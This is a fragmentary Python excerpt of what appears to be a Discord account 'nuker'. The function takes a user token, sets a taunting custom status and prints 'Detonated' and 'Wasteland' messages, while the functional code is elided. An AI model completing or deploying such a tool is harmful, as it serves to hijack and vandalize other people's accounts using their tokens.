...
def dexv_Nuke(token, Server_Name, message_Content):
    setTitle("Deploying dexvous Nuke")
    print(f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}dexv Nuke Deployed. . .")
    ...
    setting = {
          ...
          "custom_status": {"text": "I got shit on by Dexv nuker baby"},
          'status': "idle"
    }
    ...
    setTitle(f"dexv Nuke Successfully Detonated!")
    print_slow(f"{Fore.GREEN}Succesfully turned {a} into a dexvous Wasteland ")
